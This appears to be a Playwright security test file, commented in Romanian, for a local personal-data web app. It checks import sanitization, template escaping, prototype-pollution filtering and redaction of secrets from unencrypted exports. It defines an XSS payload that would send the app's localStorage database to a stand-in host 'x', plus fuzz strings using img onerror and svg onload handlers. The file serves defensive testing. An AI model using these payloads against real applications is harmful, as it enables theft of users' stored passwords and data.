// Teste r10 (22 oct. 2026): securitate — validarea datelor la import/încărcare, escape în șabloane, redactarea secretelor în copia necriptată a kitului.
// Payload-ul din audit: un id malițios care, într-un handler inline neescapat, ar trimite localStorage.omnihost_db în afara aplicației.
// Rulare: node tests/audit-r10.test.mjs  (Playwright din /opt/node-tools, Chromium local, rețea blocată)
import fs from 'node:fs';
import path from 'node:path';
import {fileURLToPath} from 'node:url';
import {createRequire} from 'node:module';
const require = createRequire('/opt/node-tools/package.json');
const {chromium} = require('playwright');
const HERE = path.dirname(fileURLToPath(import.meta.url));
const FILE = 'file://' + path.join(HERE, '..', 'index.html');
const SRC = fs.readFileSync(path.join(HERE, '..', 'index.html'), 'utf8');
let ok = 0, bad = 0;
const check = (n, c, x) => { if (c) { ok++; console.log('  ok   ' + n); } else { bad++; console.log('  FAIL ' + n + (x !== undefined ? '  → ' + JSON.stringify(x) : '')); } };
const PAYLOAD = "');location='https://x/?'+localStorage.omnihost_db//";
const LANGS = ['en', 'ro', 'fr', 'it', 'es', 'pt', 'de', 'hu'];
const MSG = {en: 'Data check', ro: 'Verificarea datelor', fr: 'Contrôle des données', it: 'Controllo dei dati', es: 'Comprobación de datos', pt: 'Verificação de dados', de: 'Datenprüfung', hu: 'Adatellenőrzés'};
const b = await chromium.launch({executablePath: '/opt/pw-browsers/chromium', args: ['--no-sandbox']});
async function open(pre) {
  const ctx = await b.newContext({viewport: {width: 1280, height: 800}, acceptDownloads: true, locale: 'en-US'});
  const net = [];
  await ctx.route(/^https?:/, (r) => { net.push(r.request().url()); r.abort(); });
  const page = await ctx.newPage();
  const errs = [];
  page.on('pageerror', (e) => errs.push('pageerror: ' + e.message));
  page.on('dialog', (d) => d.accept().catch(() => {}));
  if (pre) await page.addInitScript(pre);
  await page.goto(FILE);
  await page.waitForTimeout(1500);
  return {ctx, page, errs, net};
}
const evil = () => ({
  notes: [{id: PAYLOAD, title: 'evil', tags: '', created: '2026-01-01', updated: '2026-01-01', body: 'x'}],
  tasks: [{id: PAYLOAD, text: 'evil', done: false, priority: 'high', category: '', created: '2026-01-01'}],
  passwords: [{id: PAYLOAD, title: 'evil', username: 'u', password: 'p', url: '', updated: '2026-01-01'}],
  habits: [{id: PAYLOAD, name: 'h', icon: '📌'}],
  habitLogs: {[PAYLOAD]: {'2026-01-01': true, [PAYLOAD]: true}},
  bookmarks: [{id: PAYLOAD, title: 'b', url: 'https://example.org', tags: PAYLOAD, created: '2026-01-01'}],
  __proto__x: 1,
  settings: {lang: 'en'},
});
const evilFile = () => JSON.stringify(evil()).replace('"__proto__x"', '"__proto__"');
const SAFE = /^[A-Za-z0-9_-]{1,64}$/;
async function clickAll(page, pageIds) {
  for (const pg of pageIds) {
    await page.evaluate((p) => goTo(p), pg).catch(() => {});
    await page.waitForTimeout(40);
    await page.evaluate(() => {
      [...document.querySelectorAll('[onclick]')].slice(0, 60).forEach((e) => { try { e.click(); } catch (x) {} try { document.getElementById('modal').classList.remove('show'); } catch (x) {} });
    }).catch(() => {});
  }
}

console.log('— import: payload-ul din audit nu rulează (id malițios în notițe/sarcini/parole/obiceiuri/marcaje)');
{
  const {ctx, page, errs, net} = await open();
  await page.evaluate(() => { window.__x = 0; goTo('settings'); });
  await page.waitForTimeout(200);
  await page.locator('input[type=file][accept=".json"]').first().setInputFiles({name: 'evil.json', mimeType: 'application/json', buffer: Buffer.from(evilFile())});
  await page.waitForTimeout(1500);
  const st = await page.evaluate(() => ({n: DB.notes.map((x) => x.id), t: DB.tasks.map((x) => x.id), p: DB.passwords.map((x) => x.id), h: DB.habits.map((x) => x.id), hl: Object.keys(DB.habitLogs), proto: Object.prototype.hasOwnProperty.call(DB, '__proto__'), polluted: ({}).x1 !== undefined, ls: localStorage.getItem('omnihost_db')}));
  check('id-urile din notițe/sarcini/parole/obiceiuri au fost reparate (^[A-Za-z0-9_-]{1,64}$)', [...st.n, ...st.t, ...st.p, ...st.h].every((i) => SAFE.test(i)), st);
  check('cheile habitLogs sunt sigure, datele nevalide eliminate', st.hl.every((k) => SAFE.test(k)));
  check('cheia __proto__ nu a ajuns în date', !st.proto);
  check('copia din localStorage are doar id-uri sigure', (() => { try { const d = JSON.parse(st.ls); return [...d.notes, ...d.tasks, ...d.passwords, ...d.habits].every((e) => SAFE.test(e.id)); } catch (e) { return false; } })());
  const toast = await page.evaluate(() => [...document.querySelectorAll('body > div')].map((d) => d.textContent).join('|'));
  check('mesaj de verificare afișat', /Data check/.test(toast), toast.slice(0, 200));
  await clickAll(page, ['notes', 'tasks', 'passwords', 'habits', 'bookmarks']);
  const after = await page.evaluate(() => ({x: window.__x, href: location.href}));
  check('după clic pe elemente: fără navigare, fără cereri către x', after.href.startsWith('file:') && !net.some((u) => /\/\/x\//.test(u)), {after, net});
  check('fără erori JS', errs.length === 0, errs);
  await ctx.close();
}

console.log('— escape în șabloane (fără validare): DB setat direct cu id malițios, clic pe fiecare element');
{
  const {ctx, page, errs, net} = await open();
  await page.evaluate((e) => {
    const d = JSON.parse(e);
    DB.notes = d.notes; DB.tasks = d.tasks; DB.passwords = d.passwords; DB.habits = d.habits; DB.habitLogs = d.habitLogs; DB.bookmarks = d.bookmarks;
  }, evilFile());
  await clickAll(page, ['notes', 'tasks', 'passwords', 'habits', 'bookmarks']);
  const href = await page.evaluate(() => location.href);
  check('payload în DB (fără sanitizare): niciun handler nu rulează', href.startsWith('file:') && !net.some((u) => /\/\/x\//.test(u)), {href, net});
  check('fără erori JS', errs.length === 0, errs);
  await ctx.close();
}

console.log('— încărcare din localStorage (copie ostilă) și import prin kit (.fff.json)');
{
  const bad = evilFile();
  const {ctx, page, errs, net} = await open(`try{if(!localStorage.getItem('r10seen')){localStorage.setItem('r10seen','1');var d=${JSON.stringify(bad)};var o=JSON.parse(d);o._persistTime=Date.now()+1e9;localStorage.setItem('omnihost_db',JSON.stringify(o))}}catch(e){}`);
  const ids = await page.evaluate(() => [...DB.notes, ...DB.tasks, ...DB.passwords].map((x) => x.id));
  check('localStorage ostil: id-urile reparate la încărcare', ids.every((i) => SAFE.test(i)), ids);
  await clickAll(page, ['notes', 'tasks', 'passwords']);
  check('localStorage ostil: nicio navigare', (await page.evaluate(() => location.href)).startsWith('file:') && !net.some((u) => /\/\/x\//.test(u)), net);
  // kit
  const bundle = JSON.stringify({format: 'fff-bundle', schema: 1, app: 'omnihost', version: '1.3.7', updated: '2026-10-22', exported: new Date().toISOString(), data: {omnihost_db: JSON.stringify(Object.assign(JSON.parse(bad), {_persistTime: Date.now() + 2e9}))}});
  await Promise.all([page.waitForNavigation({waitUntil: 'load', timeout: 15000}).catch(() => null), page.evaluate((t) => FFF.bundle.import(new File([t], 'o.fff.json', {type: 'application/json'}), {confirm: false, reload: true}), bundle).catch(() => null)]);
  await page.waitForTimeout(1800);
  const ids2 = await page.evaluate(() => [...DB.notes, ...DB.tasks, ...DB.passwords].map((x) => x.id));
  check('import kit ostil: id-urile reparate după reîncărcare', ids2.length > 0 && ids2.every((i) => SAFE.test(i)), ids2);
  check('fără erori JS', errs.length === 0, errs);
  await ctx.close();
}

console.log('— validare de schemă (unitar)');
{
  const {ctx, page, errs} = await open();
  const r = await page.evaluate(() => {
    const big = {id: 'a'.repeat(200), title: 't'};
    const src = JSON.parse('{"notes":[{"id":123,"title":"num"},{"id":"a b<c>","title":"sp"},{"id":"a_b_c_","title":"coliziune"},' + JSON.stringify(big) + ',5,"s"],"tasks":"nu-e-listă","settings":{"lang":"xx-nu"},"__proto__":{"polluted":1},"constructor":{"x":1},"_customI18N":{"en":{"k":"<img src=x onerror=alert(1)>"}},"habitLogs":{"ok1":{"2026-02-03":true,"nu-e-data":true},"<b>":{"2026-02-03":true}}}');
    const res = ohSanitizeDB(src);
    const d = res.db;
    return {ids: d.notes.filter((x) => x && typeof x === 'object').map((x) => x.id), rawLen: d.notes.length, tasksIsArr: Array.isArray(d.tasks), lang: d.settings.lang, ownProto: Object.prototype.hasOwnProperty.call(d, '__proto__'), ctor: Object.prototype.hasOwnProperty.call(d, 'constructor'), i18n: d.settings && d._customI18N.en.k, hl: d.habitLogs, fixed: res.st.fixed, nonobj: ohSanitizeDB([]) === null && ohSanitizeDB('x') === null && ohSanitizeDB(null) === null};
  });
  check('ids numerice → șir; caractere nepermise → _; lungime ≤ 64; fără coliziuni', r.ids.every((i) => SAFE.test(i)) && new Set(r.ids).size === r.ids.length, r.ids);
  check('elemente primitive din colecții de obiecte eliminate', r.rawLen === r.ids.length, r.rawLen);
  check('colecție ne-listă → înlocuită cu lista implicită', r.tasksIsArr);
  check('limbă necunoscută → en', r.lang === 'en', r.lang);
  check('chei __proto__/constructor eliminate', !r.ownProto && !r.ctor);
  check('_customI18N: valorile cu < sau > neutralizate', !/[<>]/.test(r.i18n), r.i18n);
  check('habitLogs: doar chei-id și date valide', JSON.stringify(r.hl) === '{"ok1":{"2026-02-03":true}}', r.hl);
  check('rădăcină ne-obiect respinsă', r.nonobj);
  check('raport nenul', r.fixed > 0, r.fixed);
  // fișier care nu e JSON / e listă: respins cu mesaj, datele rămân
  await page.evaluate(() => { DB.notes.push({id: 'keepme', title: 'k', body: '', tags: '', created: '', updated: ''}); goTo('settings'); });
  await page.waitForTimeout(200);
  await page.locator('input[type=file][accept=".json"]').first().setInputFiles({name: 'x.json', mimeType: 'application/json', buffer: Buffer.from('[1,2,3]')});
  await page.waitForTimeout(400);
  check('import invalid: datele existente rămân', await page.evaluate(() => DB.notes.some((n) => n.id === 'keepme')));
  check('fără erori JS', errs.length === 0, errs);
  await ctx.close();
}

console.log('— mesaje traduse în 8 limbi (verificare după import + notă despre copii necriptate)');
{
  const seenNote = new Set();
  for (const L of LANGS) {
    const {ctx, page, errs} = await open();
    await page.evaluate((l) => { DB.settings.lang = l; persist(); goTo('settings'); }, L);
    await page.waitForTimeout(250);
    const note = await page.evaluate(() => ohSecMsg(OH_SEC_NOTE));
    seenNote.add(note);
    const inUI = await page.evaluate((n) => document.body.innerText.includes(n.slice(0, 40)), note);
    await page.locator('input[type=file][accept=".json"]').first().setInputFiles({name: 'evil.json', mimeType: 'application/json', buffer: Buffer.from(evilFile().replace('"settings":{"lang":"en"}', '"settings":{"lang":"' + L + '"}'))});
    const seen = await page.waitForFunction((m) => [...document.querySelectorAll('body > div')].some((d) => d.textContent.includes(m)), MSG[L], {timeout: 8000}).then(() => true).catch(() => false);
    check(L + ': mesajul de verificare tradus', seen, MSG[L]);
    check(L + ': nota despre copii necriptate afișată în Setări', inUI, note.slice(0, 40));
    check(L + ': fără erori JS', errs.length === 0, errs);
    await ctx.close();
  }
  check('8 variante distincte ale notei', seenNote.size === 8, seenNote.size);
}

console.log('— copia kitului: necriptată fără secrete, criptată completă');
{
  const {ctx, page, errs} = await open();
  await page.evaluate(() => {
    DB.passwords.push({id: 'pw1', title: 'Banca', username: 'ion', password: 'PAROLA-SECRETA-123', url: '', updated: ''});
    DB.totpKeys.push({id: 'tk1', name: 'GitHub', secret: 'JBSWY3DPEHPK3PXP', issuer: '', created: ''});
    DB.vaultEntries.push({id: 'v1', title: 'Card', category: '', icon: '', data: 'PIN: 4321-SEIF', created: ''});
    persist();
  });
  const [dl] = await Promise.all([page.waitForEvent('download'), page.evaluate(() => FFF.bundle.export())]);
  const p1 = path.join('/tmp', 'oh-r10-' + process.pid + '.fff.json');
  await dl.saveAs(p1);
  const plain = fs.readFileSync(p1, 'utf8'); fs.rmSync(p1, {force: true});
  const dbp = JSON.parse(JSON.parse(plain).data.omnihost_db);
  check('necriptată: parolele, cheile TOTP și seiful în clar lipsesc', !/PAROLA-SECRETA-123|JBSWY3DPEHPK3PXP|SEIF/.test(plain), plain.length);
  check('necriptată: restul datelor (titlu, utilizator) rămân', dbp.passwords.some((x) => x.title === 'Banca' && x.username === 'ion' && x.password === ''));
  const [dl2] = await Promise.all([page.waitForEvent('download'), page.evaluate(() => FFF.bundle.export({encrypt: true, password: 'parola-lunga-123'}))]);
  const p2 = path.join('/tmp', 'oh-r10e-' + process.pid + '.fff.json');
  await dl2.saveAs(p2);
  const enc = fs.readFileSync(p2, 'utf8'); fs.rmSync(p2, {force: true});
  check('criptată: format fff-bundle-enc, fără text în clar', JSON.parse(enc).format === 'fff-bundle-enc' && !/PAROLA-SECRETA-123|JBSWY3DPEHPK3PXP/.test(enc));
  check('fără erori JS', errs.length === 0, errs);
  await ctx.close();
}

console.log('— fuzz: toate câmpurile text din toate colecțiile = payload; vizitează toate modulele și apasă pe elementele cu onclick');
{
  // forme de obiecte din apelurile DB.<colecție>.push({...}) din sursă
  const shapes = {};
  const re = /DB\.(\w+)\.(?:push|unshift)\(\{/g; let m;
  while ((m = re.exec(SRC))) {
    let i = re.lastIndex, d = 1, j = i; while (d && j < SRC.length) { const c = SRC[j++]; if (c === '{') d++; else if (c === '}') d--; }
    const body = SRC.slice(i, j - 1); let depth = 0, cur = '', keys = [];
    for (const ch of body) { if ('({['.includes(ch)) depth++; else if (')}]'.includes(ch)) depth--; if (depth === 0 && ch === ',') { keys.push(cur); cur = ''; } else cur += ch; }
    keys.push(cur);
    (shapes[m[1]] = shapes[m[1]] || new Set());
    keys.forEach((k) => { const mm = /^\s*([A-Za-z_]\w*)\s*(:|$)/.exec(k); if (mm) shapes[m[1]].add(mm[1]); });
  }
  const sh = Object.fromEntries(Object.entries(shapes).map(([k, v]) => [k, [...v]]));
  const NUM = /amount|steps|price|weight|reps|sets|level|severity|minutes|duration|progress|qty|quantity|count|calories|score|rating|size|interval|ease|waterDays|budget|balance|total|cost|hours|distance|goal|days|year|bpm|spent|limit|target|current|number|min|max|pages|volume|temp|pressure|mood|sleep|glasses|ml|cups|streak|due/i.source;
  async function fresh() {
    const o = await open();
    await o.page.evaluate(([sh, numSrc]) => {
      window.__hits = {}; window.__h = (l) => { window.__hits[l] = 1; };
      const NUM = new RegExp(numSrc, 'i');
      const mk = (l) => `x');window.__h('${l}');('"><img src=x onerror="window.__h('${l}')"><svg/onload=window.__h('${l}')>`;
      const keep = ['settings', '_customI18N', '_langPacks', '_persistTime', 'customTheme', 'hiddenModules', 'lastBackup'];
      const poison = (v, l) => typeof v === 'string' ? mk(l) : Array.isArray(v) ? v.map((x) => poison(x, l)) : (v && typeof v === 'object') ? Object.fromEntries(Object.keys(v).map((k) => [k, poison(v[k], l + '.' + k)])) : v;
      for (const k of Object.keys(DB)) if (!keep.includes(k)) DB[k] = poison(DB[k], k);
      DB.settings.username = mk('settings.username');
      for (const k of Object.keys(sh)) { const it = {}; sh[k].forEach((f) => { it[f] = NUM.test(f) ? 7 : (f === 'done' ? false : mk(k + '.' + f)); }); DB[k] = [it, Object.assign({}, it)]; }
      DB.habitLogs = {[mk('habitLogs.key')]: {[mk('habitLogs.date')]: 1}};
    }, [sh, NUM]);
    return o;
  }
  let cur = await fresh();
  const pages = await cur.page.evaluate(() => [...new Set([...Object.keys(_megaMap), ...[...document.querySelectorAll('.nav-item[data-page]')].map((e) => e.dataset.page)])]);
  const hits = {}; const nets = []; let n = 0;
  for (const pg of pages) {
    if (cur.page.isClosed() || n++ % 20 === 19) { nets.push(...cur.net); await cur.ctx.close().catch(() => {}); cur = await fresh(); }
    await clickAll(cur.page, [pg]);
    const r = await cur.page.evaluate(() => Object.keys(window.__hits || {})).catch(() => []);
    r.forEach((l) => { if (!hits[l]) hits[l] = pg; });
  }
  nets.push(...cur.net);
  check('fuzz (' + pages.length + ' module): niciun payload nu a rulat', Object.keys(hits).length === 0, hits);
  check('fuzz: fără cereri către gazde externe neașteptate', nets.every((u) => /^https:\/\/(geocoding-api|api)\.open-meteo\.com\/|api\.dictionaryapi\.dev|api\.mymemory\.translated\.net/.test(u)), nets.filter((u) => !/open-meteo|dictionaryapi|mymemory/.test(u)));
  await cur.ctx.close();
}

console.log('— CSP și handlere inline (informativ)');
{
  const inl = (SRC.match(/\son[a-z]+="/g) || []).length;
  const csp = /Content-Security-Policy" content="([^"]*)"/.exec(SRC)[1];
  console.log('  info handlere inline în sursă: ' + inl + ' · script-src: ' + /script-src([^;]*)/.exec(csp)[1].trim());
  check('CSP: connect-src fără gazde neașteptate', !/connect-src[^;]*(\*|http:)/.test(csp));
}

await b.close();
console.log(`\n${ok} ok, ${bad} eșuate`);
process.exit(bad ? 1 : 0);
